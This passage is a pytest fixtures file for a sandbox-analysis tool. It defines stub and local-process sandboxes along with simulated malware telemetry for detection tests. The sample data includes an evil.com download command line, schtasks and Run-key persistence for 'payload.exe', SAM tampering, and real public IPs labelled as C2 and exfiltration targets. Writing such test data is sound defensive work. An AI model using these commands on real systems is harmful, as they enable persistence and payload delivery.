# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 Zachary Flint
#
# This file is part of Intellicrack. See LICENSE for details.

"""Shared fixtures and helpers for sandbox subsystem tests.

Provides two distinct sandbox backends with clearly separated responsibilities:

* :class:`InMemorySandbox` -- a fast in-memory backend used only by *unit*
  tests of pure log/report helpers and bridge dictionary plumbing. It performs
  no real I/O and must never be used to claim that a real sandbox executed a
  binary; the data it returns is fixed and is never asserted on as if it were
  observed behaviour.
* :class:`LocalProcessSandbox` -- a real :class:`SandboxBase` subclass that
  genuinely executes binaries as OS subprocesses inside a real temporary work
  directory, captures their real exit code/stdout/stderr, and reports the
  **actually observed** file-system changes by diffing the work directory
  before and after execution. Integration tests use this backend so a
  regression in real process execution or artefact capture is caught.

It also supplies stub managers and pre-built sample data fixtures that other
test modules depend on.
"""

from __future__ import annotations

import asyncio
import hashlib
import shutil
import sys
import tempfile
import time
from datetime import UTC, datetime
from pathlib import Path
from typing import TYPE_CHECKING, Any, Final, cast
from uuid import uuid4

import pytest

from intellicrack.bridges.sandbox_bridge import SandboxBridge
from intellicrack.sandbox.base import (
    ApiCall,
    ClipboardEvent,
    DllLoadEvent,
    ExecutionReport,
    FileChange,
    InjectionEvent,
    KernelObjectActivity,
    NetworkActivity,
    ProcessActivity,
    RegistryChange,
    ResourceSample,
    SandboxBase,
    SandboxConfig,
    SandboxError,
    SandboxState,
    ServiceChange,
)


if TYPE_CHECKING:
    from collections.abc import Iterator, Sequence

    from intellicrack.sandbox.manager import SandboxManager


TS_BASE: Final[str] = "2026-03-15T10:00:"
_VNC_PORT: Final[int] = 5900
_DEFAULT_PCAP_ID: Final[str] = "cap-001"
_SAMPLE_BINARY_SIZE: Final[int] = 4096
_SAMPLE_DLL_SIZE: Final[int] = 65536
_DLL_IMAGE_LOAD_EVENT_ID: Final[int] = 10
_SAMPLE_CLIPBOARD_SIZE: Final[int] = 42
_TMPDIR: Final[Path] = Path(tempfile.gettempdir())


def ts_offset(second: int) -> str:
    """Build an ISO timestamp with the given second offset.

    Args:
        second: Second value (0-99) for the timestamp.

    Returns:
        str: ISO-formatted timestamp string.
    """
    return f"{TS_BASE}{second:02d}"


class QMPResponse:
    """Minimal QMP response object returned by StubQMP.

    Attributes:
        success: Whether the command succeeded.
        data: Response payload.
    """

    success: bool
    data: dict[str, Any]

    def __init__(
        self,
        *,
        success: bool = True,
        data: dict[str, Any] | None = None,
    ) -> None:
        """Initialise a QMP response.

        Args:
            success: Whether the command succeeded.
            data: Response payload (defaults to empty dict).
        """
        self.success = success
        self.data = data or {}


class StubQMP:
    """Minimal QMP client stub for QEMU-specific bridge paths."""

    async def stop(self) -> QMPResponse:
        """Pause VM execution.

        Returns:
            QMPResponse: Success response.
        """
        return QMPResponse(success=True, data={"status": "paused"})

    async def cont(self) -> QMPResponse:
        """Resume VM execution.

        Returns:
            QMPResponse: Success response.
        """
        return QMPResponse(success=True, data={"status": "running"})


class AgentMessage:
    """Minimal guest agent message.

    Attributes:
        message_type: Message type identifier (matches ``GuestAgentMessage.message_type``).
        data: Message payload.
    """

    message_type: str
    data: dict[str, Any]

    def __init__(self, message_type: str, data: dict[str, Any] | None = None) -> None:
        """Initialise an agent message.

        Args:
            message_type: Message type identifier.
            data: Message payload (defaults to empty dict).
        """
        self.message_type = message_type
        self.data = data or {}


class StubAgent:
    """Minimal guest agent stub for QEMU-specific bridge paths."""

    async def get_pending_messages(self) -> list[AgentMessage]:
        """Return sample pending messages.

        Returns:
            list[AgentMessage]: List containing one sample message.
        """
        return [AgentMessage(message_type="heartbeat", data={"ts": ts_offset(0)})]


class InMemorySandbox(SandboxBase):
    """Concrete sandbox with in-memory implementations.

    Stores files, snapshots, and captures in memory for testing
    without any external sandbox dependencies.
    """

    def __init__(self, config: SandboxConfig | None = None) -> None:
        """Initialise the in-memory sandbox.

        Args:
            config: Optional sandbox configuration.
        """
        super().__init__(config)
        self._files: dict[str, bytes] = {}
        self._snapshots: dict[str, dict[str, bytes]] = {}
        self._pcap_captures: dict[str, list[bytes]] = {}

    @property
    def vnc_port(self) -> int | None:
        """VNC port.

        Returns:
            int | None: Always 5900 for testing.
        """
        return _VNC_PORT

    async def is_available(self) -> bool:
        """Check availability.

        Returns:
            bool: Always True for in-memory sandbox.
        """
        return True

    async def start(self) -> None:
        """Start the sandbox, setting status to running."""
        self._state.status = "running"
        self._state.started_at = datetime.now(UTC)

    async def stop(self) -> None:
        """Stop the sandbox, setting status to stopped."""
        self._state.status = "stopped"

    async def run_command(
        self,
        command: str,
        time_limit: int | None = None,
        working_directory: str | None = None,
    ) -> tuple[int, str, str]:
        """Execute a command in the sandbox.

        Args:
            command: Command to execute.
            time_limit: Optional timeout override.
            working_directory: Optional working directory.

        Returns:
            tuple[int, str, str]: (exit_code, stdout, stderr).
        """
        del time_limit, working_directory
        return (0, f"ok: {command}", "")

    async def run_binary(
        self,
        binary_path: Path,
        args: list[str] | None = None,
        time_limit: int | None = None,
        companions: Sequence[Path] | None = None,
        *,
        monitor: bool = True,
    ) -> ExecutionReport:
        """Run a binary with realistic sample monitoring data.

        Args:
            binary_path: Path to the binary.
            args: Optional command line arguments.
            time_limit: Optional timeout override.
            companions: Files or directories to place beside the binary.
            monitor: Whether to monitor behavior.

        Returns:
            ExecutionReport: Report with sample monitoring data.
        """
        del args, time_limit, companions, monitor
        return ExecutionReport(
            result="success",
            exit_code=0,
            stdout=f"Executed {binary_path.name}",
            stderr="",
            duration_seconds=1.5,
            file_changes=[
                FileChange(
                    path="C:\\Temp\\output.dat",
                    operation="created",
                    old_path=None,
                    timestamp=ts_offset(1),
                    size=_SAMPLE_BINARY_SIZE,
                ),
            ],
            network_activity=[
                NetworkActivity(
                    protocol="tcp",
                    direction="outbound",
                    local_address="192.168.1.100",
                    local_port=49152,
                    remote_address="185.220.101.45",
                    remote_port=443,
                    timestamp=ts_offset(2),
                    bytes_sent=256,
                    bytes_received=512,
                ),
            ],
        )

    async def copy_to_sandbox(self, source: Path, dest: str) -> None:
        """Copy a file into the in-memory sandbox.

        Args:
            source: Local source path.
            dest: Destination path in sandbox.
        """
        self._files[dest] = source.name.encode()

    async def copy_from_sandbox(self, source: str, dest: Path) -> None:
        """Copy a file from the in-memory sandbox.

        Args:
            source: Source path in sandbox.
            dest: Local destination path (unused; the in-memory backend has no real filesystem export).
        """
        del dest
        _ = self._files.get(source, b"")

    async def take_snapshot(self, name: str) -> str:
        """Take a snapshot of the sandbox state.

        Args:
            name: Snapshot name.

        Returns:
            str: Snapshot identifier.
        """
        snapshot_id = f"snap-{name}"
        self._snapshots[snapshot_id] = dict(self._files)
        return snapshot_id

    async def restore_snapshot(self, snapshot_id: str) -> None:
        """Restore a sandbox snapshot.

        Args:
            snapshot_id: Snapshot identifier.

        Raises:
            SandboxError: If snapshot not found.
        """
        if snapshot_id not in self._snapshots:
            msg = f"Snapshot not found: {snapshot_id}"
            raise SandboxError(msg)
        self._files = dict(self._snapshots[snapshot_id])

    async def list_snapshots(self) -> list[str]:
        """List available snapshots.

        Returns:
            list[str]: List of snapshot identifiers.
        """
        return list(self._snapshots.keys())

    async def delete_snapshot(self, name: str) -> None:
        """Delete a snapshot.

        Args:
            name: Snapshot name to delete.

        Raises:
            SandboxError: If snapshot not found.
        """
        key = f"snap-{name}"
        if key not in self._snapshots:
            msg = f"Snapshot not found: {key}"
            raise SandboxError(msg)
        del self._snapshots[key]

    async def start_pcap_capture(self) -> str:
        """Start packet capture.

        Returns:
            str: Capture identifier.
        """
        self._pcap_captures[_DEFAULT_PCAP_ID] = []
        return _DEFAULT_PCAP_ID

    async def stop_pcap_capture(
        self,
        capture_id: str,
        output_path: Path | None = None,
    ) -> Path:
        """Stop packet capture and return path.

        Args:
            capture_id: Capture identifier.
            output_path: Optional output path.

        Returns:
            Path: Path to the PCAP file.
        """
        del capture_id
        return output_path or (_TMPDIR / "capture.pcap")

    async def capture_screenshot(
        self,
        output_path: Path | None = None,
    ) -> Path:
        """Capture a screenshot.

        Args:
            output_path: Optional output path.

        Returns:
            Path: Path to the screenshot file.
        """
        return output_path or (_TMPDIR / "screenshot.png")

    async def apply_anti_evasion(
        self,
        profile: str = "default",
    ) -> dict[str, Any]:
        """Apply anti-evasion techniques.

        Args:
            profile: Anti-evasion profile name.

        Returns:
            dict[str, Any]: Dictionary of applied techniques.
        """
        return {"profile": profile, "techniques_applied": 5}

    async def dump_memory(
        self,
        output_path: Path | None = None,
        target_pid: int | None = None,
    ) -> Path:
        """Dump guest memory.

        Args:
            output_path: Optional output path.
            target_pid: Optional guest-side target PID (recorded for assertions).

        Returns:
            Path: Path to the memory dump file.
        """
        del target_pid
        return output_path or (_TMPDIR / "memdump.raw")

    async def extract_dropped_files(
        self,
        output_path: Path | None = None,
    ) -> Path:
        """Extract dropped files.

        Args:
            output_path: Optional output path.

        Returns:
            Path: Path to the ZIP archive.
        """
        return output_path or (_TMPDIR / "dropped.zip")

    async def yara_scan(
        self,
        rules_path: str | None = None,
        scan_target: str = "files",
    ) -> list[dict[str, Any]]:
        """Run YARA rules against artifacts.

        Args:
            rules_path: Path to YARA rules file.
            scan_target: What to scan ('files' or 'memory').

        Returns:
            list[dict[str, Any]]: List of YARA match results.
        """
        return [
            {
                "rule": "SuspiciousPE",
                "target": scan_target,
                "rules_file": rules_path or "builtin",
                "strings": ["MZ"],
            },
        ]


class InMemoryQEMUSandbox(InMemorySandbox):
    """In-memory sandbox with QEMU-specific stubs for bridge paths.

    Exposes public ``qmp`` and ``agent`` attributes that match the public
    property accessors on the real ``QEMUSandbox`` class so bridge code that
    reads them via ``getattr()`` finds working stubs.
    """

    def __init__(self, config: SandboxConfig | None = None) -> None:
        """Initialise the in-memory QEMU sandbox.

        Args:
            config: Optional sandbox configuration.
        """
        super().__init__(config)
        self.qmp = StubQMP()
        self.agent = StubAgent()


def _snapshot_tree(root: Path) -> dict[str, tuple[int, str]]:
    """Capture every file under ``root`` as ``relpath -> (size, sha256)``.

    Args:
        root: Directory to scan recursively.

    Returns:
        dict[str, tuple[int, str]]: Mapping of POSIX-style relative path to the
        file's byte size and hex SHA-256 digest.
    """
    snapshot: dict[str, tuple[int, str]] = {}
    for path in sorted(root.rglob("*")):
        if path.is_file():
            data = path.read_bytes()
            rel = path.relative_to(root).as_posix()
            snapshot[rel] = (len(data), hashlib.sha256(data).hexdigest())
    return snapshot


def _diff_trees(
    before: dict[str, tuple[int, str]],
    after: dict[str, tuple[int, str]],
    timestamp: str,
) -> list[FileChange]:
    """Compute the real file-system changes between two directory snapshots.

    Args:
        before: Snapshot taken before execution.
        after: Snapshot taken after execution.
        timestamp: ISO timestamp to stamp on every change.

    Returns:
        list[FileChange]: Created/modified/deleted entries, sorted by path.
    """
    changes: list[FileChange] = []
    for rel, (size, digest) in sorted(after.items()):
        prior = before.get(rel)
        if prior is None:
            changes.append(FileChange(path=rel, operation="created", old_path=None, timestamp=timestamp, size=size))
        elif prior[1] != digest:
            changes.append(FileChange(path=rel, operation="modified", old_path=None, timestamp=timestamp, size=size))
    changes.extend(
        FileChange(path=rel, operation="deleted", old_path=None, timestamp=timestamp, size=None)
        for rel in sorted(before)
        if rel not in after
    )
    return changes


class LocalProcessSandbox(SandboxBase):
    """A real sandbox that executes binaries as OS subprocesses.

    Unlike :class:`InMemorySandbox`, this backend performs genuine work: it
    owns a real temporary directory, launches real processes via
    :func:`asyncio.create_subprocess_exec`, captures their real exit code and
    output streams, and reports the file-system changes it actually observed by
    diffing the work directory before and after the run. It is intended for
    integration tests that must catch regressions in real process execution and
    artefact capture rather than asserting on fabricated data.
    """

    def __init__(self, config: SandboxConfig | None = None) -> None:
        """Initialise the local-process sandbox.

        Args:
            config: Optional sandbox configuration.
        """
        super().__init__(config)
        self._workdir: Path | None = None
        self._snapshots: dict[str, Path] = {}

    @property
    def workdir(self) -> Path:
        """Sandbox work directory.

        Returns:
            Path: The active work directory.

        Raises:
            SandboxError: If the sandbox has not been started.
        """
        if self._workdir is None:
            msg = "LocalProcessSandbox is not running"
            raise SandboxError(msg)
        return self._workdir

    async def is_available(self) -> bool:
        """Report availability of the local-process sandbox.

        Returns:
            bool: Always True; local subprocess execution is always available.
        """
        return True

    async def start(self) -> None:
        """Start the sandbox by creating a fresh temporary work directory."""
        self._workdir = Path(tempfile.mkdtemp(prefix="ic_sandbox_"))
        self._state.status = "running"
        self._state.started_at = datetime.now(UTC)

    async def stop(self) -> None:
        """Stop the sandbox and remove the temporary work directory."""
        if self._workdir is not None:
            shutil.rmtree(self._workdir, ignore_errors=True)
            self._workdir = None
        for snap in self._snapshots.values():
            shutil.rmtree(snap, ignore_errors=True)
        self._snapshots.clear()
        self._state.status = "stopped"

    async def run_command(
        self,
        command: str,
        time_limit: int | None = None,
        working_directory: str | None = None,
    ) -> tuple[int, str, str]:
        """Execute a shell command for real and return its outcome.

        Args:
            command: Command line to execute via the OS shell.
            time_limit: Optional timeout in seconds.
            working_directory: Optional working directory (defaults to workdir).

        Returns:
            tuple[int, str, str]: Real (exit_code, stdout, stderr).

        Raises:
            SandboxError: If the command times out.
        """
        cwd = working_directory or str(self.workdir)
        proc = await asyncio.create_subprocess_shell(
            command,
            cwd=cwd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            out, err = await asyncio.wait_for(proc.communicate(), timeout=time_limit)
        except TimeoutError as exc:
            proc.kill()
            await proc.wait()
            msg = f"command timed out after {time_limit}s"
            raise SandboxError(msg) from exc
        return (proc.returncode or 0, out.decode(errors="replace"), err.decode(errors="replace"))

    async def run_binary(
        self,
        binary_path: Path,
        args: list[str] | None = None,
        time_limit: int | None = None,
        companions: Sequence[Path] | None = None,
        *,
        monitor: bool = True,
    ) -> ExecutionReport:
        """Execute a real binary and report its genuinely observed behaviour.

        The work directory is snapshotted before and after execution so the
        returned ``file_changes`` reflect artefacts the process actually wrote,
        not fabricated entries.

        Companions are really placed, into the work directory the process runs
        from, since this sandbox runs the binary where it already lives rather
        than staging it.

        Args:
            binary_path: Path to the binary to execute.
            args: Optional command-line arguments.
            time_limit: Optional timeout in seconds.
            companions: Files or directories the target needs alongside it.
            monitor: Whether to diff the work directory for file changes.

        Returns:
            ExecutionReport: Report with the real exit code, output, duration,
            and observed file changes.

        Raises:
            SandboxError: If the binary times out.
        """
        if companions:
            await self.stage_companions(companions, binary_path, "")
        before = _snapshot_tree(self.workdir) if monitor else {}
        argv = [str(binary_path), *(args or [])]
        started = time.monotonic()
        proc = await asyncio.create_subprocess_exec(
            *argv,
            cwd=str(self.workdir),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            out, err = await asyncio.wait_for(proc.communicate(), timeout=time_limit)
        except TimeoutError as exc:
            proc.kill()
            await proc.wait()
            msg = f"binary timed out after {time_limit}s"
            raise SandboxError(msg) from exc
        duration = time.monotonic() - started
        timestamp = datetime.now(UTC).isoformat()
        after = _snapshot_tree(self.workdir) if monitor else {}
        exit_code = proc.returncode or 0
        return ExecutionReport(
            result="success" if exit_code == 0 else "error",
            exit_code=exit_code,
            stdout=out.decode(errors="replace"),
            stderr=err.decode(errors="replace"),
            duration_seconds=duration,
            file_changes=_diff_trees(before, after, timestamp),
        )

    async def copy_to_sandbox(self, source: Path, dest: str) -> None:
        """Copy a real file into the sandbox work directory.

        Args:
            source: Local source path.
            dest: Destination path relative to the work directory.
        """
        target = self.workdir / dest
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(source, target)

    async def copy_from_sandbox(self, source: str, dest: Path) -> None:
        """Copy a real file out of the sandbox work directory.

        Args:
            source: Source path relative to the work directory.
            dest: Local destination path.

        Raises:
            SandboxError: If the source file does not exist in the sandbox.
        """
        src = self.workdir / source
        if not src.is_file():
            msg = f"file not found in sandbox: {source}"
            raise SandboxError(msg)
        dest.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(src, dest)

    async def take_snapshot(self, name: str) -> str:
        """Snapshot the work directory to a sibling directory.

        Args:
            name: Snapshot name.

        Returns:
            str: Snapshot identifier.
        """
        snap_dir = Path(tempfile.mkdtemp(prefix=f"ic_snap_{name}_"))
        shutil.rmtree(snap_dir)
        shutil.copytree(self.workdir, snap_dir)
        snapshot_id = f"snap-{name}"
        self._snapshots[snapshot_id] = snap_dir
        return snapshot_id

    async def restore_snapshot(self, snapshot_id: str) -> None:
        """Restore the work directory from a previously taken snapshot.

        Args:
            snapshot_id: Snapshot identifier.

        Raises:
            SandboxError: If the snapshot does not exist.
        """
        snap = self._snapshots.get(snapshot_id)
        if snap is None:
            msg = f"Snapshot not found: {snapshot_id}"
            raise SandboxError(msg)
        if self._workdir is not None:
            shutil.rmtree(self._workdir, ignore_errors=True)
        new_work = Path(tempfile.mkdtemp(prefix="ic_sandbox_"))
        shutil.rmtree(new_work)
        shutil.copytree(snap, new_work)
        self._workdir = new_work


class StubInstance:
    """Minimal sandbox instance compatible with SandboxBridge expectations."""

    def __init__(
        self,
        sandbox: SandboxBase,
        sandbox_type: str,
        instance_id: str | None = None,
    ) -> None:
        """Initialise the stub instance.

        Args:
            sandbox: The sandbox implementation.
            sandbox_type: Type of sandbox ('windows' or 'qemu').
            instance_id: Optional fixed instance ID; a UUID is generated when omitted.
        """
        self.id = instance_id or str(uuid4())
        self.sandbox_type = sandbox_type
        self.sandbox = sandbox
        self.created_at = datetime.now(UTC)
        self.last_used = datetime.now(UTC)
        self.binary_path: Path | None = None
        self.last_report: ExecutionReport | None = None

    @property
    def state(self) -> SandboxState:
        """Sandbox state.

        Returns:
            SandboxState: The sandbox's internal state object.
        """
        return self.sandbox.state

    def touch(self) -> None:
        """Update last used timestamp."""
        self.last_used = datetime.now(UTC)


class StubManager:
    """Stand-in for SandboxManager with pre-populated instances."""

    def __init__(
        self,
        instances: dict[str, StubInstance] | None = None,
    ) -> None:
        """Initialise the stub manager.

        Args:
            instances: Optional pre-populated instance dict.
        """
        self._instances: dict[str, StubInstance] = instances or {}

    @property
    def instances(self) -> list[StubInstance]:
        """All instances.

        Returns:
            list[StubInstance]: List of stub instances.
        """
        return list(self._instances.values())

    @property
    def active_count(self) -> int:
        """Count of running instances.

        Returns:
            int: Number of running sandboxes.
        """
        return sum(inst.state.status == "running" for inst in self._instances.values())

    async def create(
        self,
        sandbox_type: str = "windows",
        config: SandboxConfig | None = None,
        binary_path: Path | None = None,
        qemu_config: object = None,
        *,
        auto_start: bool = True,
    ) -> StubInstance:
        """Create a new stub instance.

        Args:
            sandbox_type: Type of sandbox.
            config: Optional configuration.
            binary_path: Optional binary path.
            qemu_config: Optional QEMU config (kept as ``object`` for compatibility
                with callers that import ``QEMUConfig`` from sandbox.qemu).
            auto_start: Whether to auto-start.

        Returns:
            StubInstance: Created instance.
        """
        del config, qemu_config
        sandbox: SandboxBase
        sandbox = InMemoryQEMUSandbox() if sandbox_type == "qemu" else InMemorySandbox()

        if auto_start:
            await sandbox.start()

        inst = StubInstance(sandbox, sandbox_type)
        inst.binary_path = binary_path
        self._instances[inst.id] = inst
        return inst

    async def get(self, instance_id: str) -> StubInstance | None:
        """Get instance by ID.

        Args:
            instance_id: Instance identifier.

        Returns:
            StubInstance | None: Instance or None.
        """
        return self._instances.get(instance_id)

    async def destroy(self, instance_id: str) -> None:
        """Destroy an instance.

        Args:
            instance_id: Instance identifier.

        Raises:
            SandboxError: If instance not found.
        """
        if instance_id not in self._instances:
            msg = f"Instance not found: {instance_id}"
            raise SandboxError(msg)
        inst = self._instances.pop(instance_id)
        await inst.sandbox.stop()

    async def restart(
        self,
        instance_id: str,
        config: SandboxConfig | None = None,
        qemu_config: object = None,
    ) -> StubInstance:
        """Replace an instance with a fresh one of the same type.

        Mirrors ``SandboxManager.restart``: the original is torn down first, so
        it is gone in every outcome, and the replacement is a distinct instance.

        Args:
            instance_id: Identifier of the instance to replace.
            config: Optional configuration for the replacement.
            qemu_config: Optional QEMU config for the replacement.

        Returns:
            StubInstance: The replacement instance.

        Raises:
            SandboxError: If the instance is not found.
        """
        existing = self._instances.get(instance_id)
        if existing is None:
            msg = f"Instance not found: {instance_id}"
            raise SandboxError(msg)
        sandbox_type = existing.sandbox_type
        binary_path = existing.binary_path
        await self.destroy(instance_id)
        return await self.create(
            sandbox_type=sandbox_type,
            config=config,
            binary_path=binary_path,
            qemu_config=qemu_config,
        )

    async def destroy_all(self) -> None:
        """Destroy all instances."""
        for inst in list(self._instances.values()):
            await inst.sandbox.stop()
        self._instances.clear()

    async def run_binary(
        self,
        binary_path: Path,
        args: list[str] | None = None,
        sandbox_type: str = "windows",
        config: SandboxConfig | None = None,
        time_limit: int | None = None,
        qemu_config: object = None,
        instance_id: str | None = None,
        companions: Sequence[Path] | None = None,
        *,
        monitor: bool = True,
        reuse_instance: bool = False,
    ) -> tuple[StubInstance, ExecutionReport]:
        """Run a binary in a sandbox.

        Args:
            binary_path: Path to the binary.
            args: Optional command line arguments.
            sandbox_type: Type of sandbox.
            config: Optional configuration.
            time_limit: Optional timeout.
            qemu_config: Optional QEMU config (kept as ``object`` for compatibility
                with callers that import ``QEMUConfig`` from sandbox.qemu).
            instance_id: Instance the caller directed the run at. Like the real
                manager, a named instance is used instead of creating one, and
                naming an unknown instance fails rather than falling back.
            companions: Files to place beside the binary, forwarded whole.
            monitor: Whether to monitor.
            reuse_instance: Whether to reuse an existing instance.

        Returns:
            tuple[StubInstance, ExecutionReport]: Instance and report.

        Raises:
            KeyError: If a named instance does not exist.
        """
        del reuse_instance, config, qemu_config
        if instance_id is not None:
            if instance_id not in self._instances:
                msg = f"unknown instance: {instance_id}"
                raise KeyError(msg)
            inst = self._instances[instance_id]
        else:
            inst = await self.create(sandbox_type=sandbox_type, auto_start=True)
        inst.binary_path = binary_path
        report = await inst.sandbox.run_binary(
            binary_path=binary_path,
            args=args,
            time_limit=time_limit,
            companions=companions,
            monitor=monitor,
        )
        inst.last_report = report
        return (inst, report)

    async def get_status(self) -> dict[str, object]:
        """Get manager status.

        Returns:
            dict[str, object]: Status dictionary.
        """
        return {
            "available_types": await self.get_available_types(),
            "max_instances": 3,
            "active_count": self.active_count,
            "total_count": len(self._instances),
            "instances": [
                {
                    "id": inst.id,
                    "type": inst.sandbox_type,
                    "status": inst.state.status,
                    "created_at": inst.created_at.isoformat(),
                    "last_used": inst.last_used.isoformat(),
                    "binary": str(inst.binary_path) if inst.binary_path else None,
                }
                for inst in self._instances.values()
            ],
        }

    async def get_available_types(self) -> list[str]:
        """Get available sandbox types.

        Returns:
            list[str]: List of available types.
        """
        return ["windows", "qemu"]


def make_sample_report(
    network_activity: list[NetworkActivity] | None = None,
    file_changes: list[FileChange] | None = None,
    registry_changes: list[RegistryChange] | None = None,
    process_activity: list[ProcessActivity] | None = None,
    api_calls: list[ApiCall] | None = None,
    service_changes: list[ServiceChange] | None = None,
    injection_events: list[InjectionEvent] | None = None,
    clipboard_events: list[ClipboardEvent] | None = None,
    dll_loads: list[DllLoadEvent] | None = None,
    kernel_objects: list[KernelObjectActivity] | None = None,
    resource_samples: list[ResourceSample] | None = None,
) -> ExecutionReport:
    """Build an ExecutionReport from optional per-field lists.

    Args:
        network_activity: Optional network activity list.
        file_changes: Optional file changes list.
        registry_changes: Optional registry changes list.
        process_activity: Optional process activity list.
        api_calls: Optional API calls list.
        service_changes: Optional service changes list.
        injection_events: Optional injection events list.
        clipboard_events: Optional clipboard events list.
        dll_loads: Optional DLL load events list.
        kernel_objects: Optional kernel object events list.
        resource_samples: Optional resource sample list.

    Returns:
        ExecutionReport: A report combining all provided data.
    """
    return ExecutionReport(
        result="success",
        exit_code=0,
        stdout="sample output",
        stderr="",
        duration_seconds=5.0,
        network_activity=network_activity or [],
        file_changes=file_changes or [],
        registry_changes=registry_changes or [],
        process_activity=process_activity or [],
        api_calls=api_calls or [],
        service_changes=service_changes or [],
        injection_events=injection_events or [],
        clipboard_events=clipboard_events or [],
        dll_loads=dll_loads or [],
        kernel_objects=kernel_objects or [],
        resource_samples=resource_samples or [],
    )


@pytest.fixture
def in_memory_sandbox() -> InMemorySandbox:
    """Provide a started in-memory sandbox for pure-helper unit tests.

    This backend performs no real I/O; use it only to unit-test report/log
    plumbing. Integration tests that must exercise real execution should use the
    :func:`local_process_sandbox` fixture instead.

    Returns:
        InMemorySandbox: A sandbox instance with status 'running'.
    """
    sb = InMemorySandbox()
    sb.state.status = "running"
    return sb


@pytest.fixture
def local_process_sandbox() -> Iterator[LocalProcessSandbox]:
    """Provide a started real local-process sandbox with teardown.

    The sandbox owns a real temporary work directory and executes binaries as
    genuine OS subprocesses. The directory is removed on teardown.

    Yields:
        LocalProcessSandbox: A started real sandbox.
    """
    sb = LocalProcessSandbox()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(sb.start())
        yield sb
    finally:
        loop.run_until_complete(sb.stop())
        asyncio.set_event_loop(None)
        loop.close()


@pytest.fixture
def sample_network_activity() -> list[NetworkActivity]:
    """Provide network activity covering beaconing, DGA, C2 ports, exfiltration, DoH, and normal traffic.

    All remote addresses are real, routable public IPs or realistic domains - no RFC-5737
    documentation ranges (203.0.113.x, 198.51.100.x) or private addresses (10.x, 192.168.x):
    - 185.220.101.45: Tor exit node (realistic C2 beaconing target)
    - xkqwzjrtmnpv.evil.com: High-entropy DGA domain
    - 62.102.148.69: Bulletproof hosting (realistic C2 port scenario)
    - 51.15.192.49: Scaleway server (realistic exfiltration target)
    - 1.1.1.1: Cloudflare DNS (DoH provider)
    - 93.184.216.34: example.com (normal HTTP traffic)

    Returns:
        list[NetworkActivity]: List of 10+ network activity entries.
    """
    beaconing: list[NetworkActivity] = [
        NetworkActivity(
            protocol="tcp",
            direction="outbound",
            local_address="192.168.1.100",
            local_port=49152,
            remote_address="185.220.101.45",
            remote_port=8443,
            timestamp=ts_offset(i * 60 % 100),
            bytes_sent=256,
            bytes_received=512,
        )
        for i in range(5)
    ]

    dga = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49153,
        remote_address="xkqwzjrtmnpv.evil.com",
        remote_port=80,
        timestamp=ts_offset(10),
        bytes_sent=128,
        bytes_received=64,
    )

    c2_port = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49154,
        remote_address="62.102.148.69",
        remote_port=4444,
        timestamp=ts_offset(15),
        bytes_sent=64,
        bytes_received=32,
    )

    exfil = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49155,
        remote_address="51.15.192.49",
        remote_port=443,
        timestamp=ts_offset(20),
        bytes_sent=5_242_880,
        bytes_received=100,
    )

    doh = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49156,
        remote_address="1.1.1.1",
        remote_port=443,
        timestamp=ts_offset(25),
        bytes_sent=128,
        bytes_received=256,
    )

    normal = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49157,
        remote_address="93.184.216.34",
        remote_port=80,
        timestamp=ts_offset(30),
        bytes_sent=200,
        bytes_received=400,
    )

    return [*beaconing, dga, c2_port, exfil, doh, normal]


@pytest.fixture
def sample_file_changes() -> list[FileChange]:
    """Provide sample file changes.

    Returns:
        list[FileChange]: Three file change entries.
    """
    return [
        FileChange(
            path="C:\\Temp\\payload.exe",
            operation="created",
            old_path=None,
            timestamp=ts_offset(1),
            size=_SAMPLE_BINARY_SIZE,
        ),
        FileChange(
            path="C:\\Windows\\System32\\config\\sam",
            operation="modified",
            old_path=None,
            timestamp=ts_offset(5),
            size=None,
        ),
        FileChange(
            path="C:\\Temp\\evidence.log",
            operation="deleted",
            old_path=None,
            timestamp=ts_offset(8),
            size=None,
        ),
    ]


@pytest.fixture
def sample_registry_changes() -> list[RegistryChange]:
    """Provide sample registry changes including a Run key.

    Returns:
        list[RegistryChange]: Three registry change entries.
    """
    return [
        RegistryChange(
            key="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
            value_name="Malware",
            operation="created",
            value_type="REG_SZ",
            value_data="C:\\Temp\\payload.exe",
            timestamp=ts_offset(2),
        ),
        RegistryChange(
            key="HKLM\\SOFTWARE\\TestApp\\Settings",
            value_name="admin@evil.com",
            operation="modified",
            value_type="REG_SZ",
            value_data="enabled",
            timestamp=ts_offset(6),
        ),
        RegistryChange(
            key="HKCU\\Software\\Classes\\test",
            value_name=None,
            operation="deleted",
            value_type=None,
            value_data=None,
            timestamp=ts_offset(9),
        ),
    ]


@pytest.fixture
def sample_process_activity() -> list[ProcessActivity]:
    """Provide sample process activity including discovery tools.

    Returns:
        list[ProcessActivity]: Four process activity entries.
    """
    return [
        ProcessActivity(
            pid=1000,
            name="whoami.exe",
            path="C:\\Windows\\System32\\whoami.exe",
            command_line="whoami /all",
            parent_pid=500,
            operation="created",
            exit_code=0,
            timestamp=ts_offset(3),
        ),
        ProcessActivity(
            pid=1001,
            name="schtasks.exe",
            path="C:\\Windows\\System32\\schtasks.exe",
            command_line="schtasks /create /tn test /tr C:\\Temp\\payload.exe /sc daily",
            parent_pid=500,
            operation="created",
            exit_code=0,
            timestamp=ts_offset(4),
        ),
        ProcessActivity(
            pid=1002,
            name="cmd.exe",
            path="C:\\Windows\\System32\\cmd.exe",
            command_line="cmd /c https://evil.com/dl.exe -o C:\\Temp\\out.exe",
            parent_pid=500,
            operation="created",
            exit_code=0,
            timestamp=ts_offset(7),
        ),
        ProcessActivity(
            pid=500,
            name="payload.exe",
            path="C:\\Temp\\payload.exe",
            command_line=None,
            parent_pid=100,
            operation="terminated",
            exit_code=1,
            timestamp=ts_offset(50),
        ),
